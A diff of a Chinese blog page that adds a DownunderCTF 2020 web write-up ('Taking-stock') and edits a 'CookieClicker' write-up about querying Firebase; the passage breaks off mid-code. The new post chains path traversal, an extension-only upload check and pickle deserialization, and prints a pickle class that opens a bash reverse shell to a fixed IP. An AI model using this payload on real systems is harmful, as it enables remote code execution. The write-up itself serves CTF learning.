@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-count">75</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">88</span>
+        <span class="site-state-item-count">89</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -283,6 +283,125 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/22/DownunderCTF-Web-Taking-stock/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/22/DownunderCTF-Web-Taking-stock/" class="post-title-link" itemprop="url">DownunderCTF-Web-Taking-stock</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-09-22 09:44:36 / 修改时间：16:06:04" itemprop="dateCreated datePublished" datetime="2020-09-22T09:44:36+08:00">2020-09-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/22/DownunderCTF-Web-Taking-stock/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/22/DownunderCTF-Web-Taking-stock/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>DownunderCTF 2020 Taking-stock。给了一个train.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t upload this file to production.</span></span><br><span class="line"><span class="comment"># Train models locally and copy them into the deployment</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> quandl</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">WINDOW = <span class="number">30</span></span><br><span class="line">quandl.ApiConfig.api_key = <span class="string">&quot;REDACTED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">name, cache=True</span>):</span></span><br><span class="line">    fn = <span class="string">f&#x27;<span class="subst">&#123;name.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>)&#125;</span>.cache.joblib&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> cache:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(fn):</span><br><span class="line">            df = joblib.load(fn)</span><br><span class="line">            <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line">    df = quandl.get(name)</span><br><span class="line">    joblib.dump(df, fn)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_model</span>(<span class="params">data</span>):</span></span><br><span class="line">    df = data[[<span class="string">&#x27;Adj. Close&#x27;</span>]]</span><br><span class="line">    df[<span class="string">&#x27;Prediction&#x27;</span>] = df[[<span class="string">&#x27;Adj. Close&#x27;</span>]].shift(-WINDOW)</span><br><span class="line"></span><br><span class="line">    ds = np.array(df.drop([<span class="string">&#x27;Prediction&#x27;</span>], <span class="number">1</span>))</span><br><span class="line">    ds = ds[:-WINDOW]</span><br><span class="line">    </span><br><span class="line">    lb = np.array(df[<span class="string">&#x27;Prediction&#x27;</span>])</span><br><span class="line">    lb = lb[:-WINDOW]</span><br><span class="line">    </span><br><span class="line">    ds_train, ds_test, lb_train, lb_test = train_test_split(ds, lb, test_size=<span class="number">0.2</span>)</span><br><span class="line">    </span><br><span class="line">    model = LinearRegression()</span><br><span class="line">    model.fit(ds_train, lb_train)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    stock = sys.argv[<span class="number">1</span>]</span><br><span class="line">    stock_name = stock.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    use_cache = len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&#x27;--no-cache&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = get_data(stock, cache=sys.argv)</span><br><span class="line">    model = get_model(data)</span><br><span class="line">    joblib.dump(model, <span class="string">f&#x27;<span class="subst">&#123;stock_name&#125;</span>.joblib&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>打开是一个股票预测界面，输入数值后会根据输入预测变化情况。然后我们发现有个登录，随手一发SSTI<code>&#123;9*9&#125;</code>，结果没那么简单，原样输出了。然后有个上传，只能是PNG。但是仅验证了文件后缀。</p>
+<p>抓包发现，首次登陆后的Me页面里会GET/profile-picture/{uuid}，然后返回No such file /tmp/{uuid}.png，我们上传的文件会保存在/tmp目录下。然后注意到奇怪的事情，我们把uuid改了，</p>
+<p>还会正常显示上传的图片。很明显，/profile-picture还会判断Cookie。我们解一下Cookie，明显Flask的。<code>"eyJpZCI6IjgxMDM1M2JiLTc4NmMtNGIzYi05N2IwLTIyMWI5ODFhODZiYyIsInVzZXJuYW1lIjoie3s5Kjl9fSJ9.X2laXw.PxXhwXbzp8aKXJeUIXaQFoUgrrM"</code>的结果是<code>&#123;"id":"810353bb-786c-4b3b-97b0-221b981a86bc","username":"&#123;&#123;9*9&#125;&#125;"&#125;</code>。但是目前上传没太多作用，找不到什么序列化或者LFI的。</p>
+<p>回头看股票预测页面，有四个选项，Google Facebook Apple Amazon，我们点Predict的时候，会POST prices和stock（不过很奇怪，我在本地做的时候Burpsuite抓不到包），我们把stock改成../../../../../../../../etc/passwd，提示<code>Failed to load ./models/../../../../../../../../etc/passwd</code>，LFI。</p>
+<p>LFI有了，文件上传有了，然后干什么？给的那个train.py还没看呢。</p>
+<p>joblib是啥？参考<a target="_blank" rel="noopener" href="https://joblib.readthedocs.io/en/latest/generated/joblib.load.html">文档</a>，是一套并行运行的工具库，我们重点关注这里用的load函数。文档明确提示使用pickle，那就好办了。不知道能否有回显，我们直接反弹shell。</p>
+<p>先写好模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = (<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.50.186/6379 0&gt;&amp;1&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> os.system, (cmd,)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后pickle 生成序列化文件，上传，最后predict引用即可弹shell。</p>
+
+    <div id="aplayer-DyhUtecG" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1296550461" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{8b378ef6-ad0b-42b2-acb7-9ea7a122fd54}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/21/DownunderCTF-Web-CookieClicker/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -310,10 +429,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2020-09-21 17:10:18 / 修改时间：21:58:27" itemprop="dateCreated datePublished" datetime="2020-09-21T17:10:18+08:00">2020-09-21</time>
+      <time title="创建时间：2020-09-21 17:10:18" itemprop="dateCreated datePublished" datetime="2020-09-21T17:10:18+08:00">2020-09-21</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-22 09:06:46" itemprop="dateModified" datetime="2020-09-22T09:06:46+08:00">2020-09-22</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -378,10 +503,10 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>访问后会发现报错： Uncaught (in promise) FirebaseError: Missing or insufficient permissions. (ﾟ∀。)，还要权限？那么得从登录开始抓包了。发现登陆的时候有verifyPassword的URL，但是Key是加密的，这种情况下我们先不轻易解这个加密，回去翻文档，看有没有认证的选项。在<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/auth/web/start#sign_in_existing_users">这里</a>看到了登录的选项，那么添一段登录代码： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;firebasejs&#x2F;7.21.0&#x2F;firebase-app.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;firebasejs&#x2F;7.21.0&#x2F;firebase-analytics.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Add Firebase products that you want to use --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;firebasejs&#x2F;7.21.0&#x2F;firebase-auth.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;www.gstatic.com&#x2F;firebasejs&#x2F;7.21.0&#x2F;firebase-firestore.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var firebaseConf &#x3D; &#123;</span><br><span class="line">        apiKey: &quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;,</span><br><span class="line">        authDomain: &quot;cookie-clicker1.firebaseapp.com&quot;,</span><br><span class="line">        databaseURL: &quot;https:&#x2F;&#x2F;cookie-clicker1.firebaseio.com&quot;,</span><br><span class="line">        projectId: &quot;cookie-clicker1&quot;,</span><br><span class="line">        storageBucket: &quot;cookie-clicker1.appspot.com&quot;,</span><br><span class="line">        messagingSenderId: &quot;186649534277&quot;,</span><br><span class="line">        appId: &quot;1:186649534277:web:a75d541debbd366cebe82c&quot;,</span><br><span class="line">        measurementId: &quot;G-7LWV67HSXP&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line">    firebase.auth().signInWithEmailAndPassword(&quot;tiaonmm@test.com&quot;, &quot;tiaonmmn&quot;).catch(function(error) &#123;</span><br><span class="line">        &#x2F;&#x2F; Handle Errors here.</span><br><span class="line">        var errorCode &#x3D; error.code;</span><br><span class="line">        var errorMessage &#x3D; error.message;</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;);</span><br><span class="line">    var db&#x3D;firebase.firestore();</span><br><span class="line">    db.collection(&quot;users&quot;).get().then((querySnapshot) &#x3D;&gt; &#123;</span><br><span class="line">        querySnapshot.forEach((doc) &#x3D;&gt; &#123;</span><br><span class="line">            console.log(&#96;$&#123;doc.id&#125; &#x3D;&gt; $&#123;doc.data()&#125;&#96;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    db.collection(&quot;cookies&quot;).get().then((querySnapshot) &#x3D;&gt; &#123;</span><br><span class="line">        querySnapshot.forEach((doc) &#x3D;&gt; &#123;</span><br><span class="line">            console.log(&#96;$&#123;doc.id&#125; &#x3D;&gt; $&#123;doc.data()&#125;&#96;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
 <p>发现users我们没办法访问，但是cookies可以，不过我们的代码有问题，直接把对象toString()了，改一下。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Insert these scripts at the bottom of the HTML, but before you use any Firebase services --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Firebase App (the core Firebase SDK) is always required and must be listed first --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- If you enabled Analytics in your project, add the Firebase SDK for Analytics --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Add Firebase products that you want to use --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-auth.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.gstatic.com/firebasejs/7.21.0/firebase-firestore.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> firebaseConf = &#123;</span></span><br><span class="line"><span class="javascript">        apiKey: <span class="string">&quot;AIzaSyDOCn4NThEqv9Y-afv36PfJWBUYiGm1rkI&quot;</span>,</span></span><br><span class="line"><span class="javascript">        authDomain: <span class="string">&quot;cookie-clicker1.firebaseapp.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        databaseURL: <span class="string">&quot;https://cookie-clicker1.firebaseio.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        projectId: <span class="string">&quot;cookie-clicker1&quot;</span>,</span></span><br><span class="line"><span class="javascript">        storageBucket: <span class="string">&quot;cookie-clicker1.appspot.com&quot;</span>,</span></span><br><span class="line"><span class="javascript">        messagingSenderId: <span class="string">&quot;186649534277&quot;</span>,</span></span><br><span class="line"><span class="javascript">        appId: <span class="string">&quot;1:186649534277:web:a75d541debbd366cebe82c&quot;</span>,</span></span><br><span class="line"><span class="javascript">        measurementId: <span class="string">&quot;G-7LWV67HSXP&quot;</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    firebase.initializeApp(firebaseConf);</span><br><span class="line"><span class="javascript">    firebase.auth().signInWithEmailAndPassword(<span class="string">&quot;tiaonmm@test.com&quot;</span>, <span class="string">&quot;tiaonmmn&quot;</span>).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Handle Errors here.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorCode = error.code;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errorMessage = error.message;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> db=firebase.firestore();</span></span><br><span class="line"><span class="javascript">    db.collection(<span class="string">&quot;users&quot;</span>).get().then(<span class="function">(<span class="params">querySnapshot</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        querySnapshot.forEach(<span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;doc.id&#125;</span> =&gt; <span class="subst">$&#123;doc.data()&#125;</span>`</span>);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="javascript">    db.collection(<span 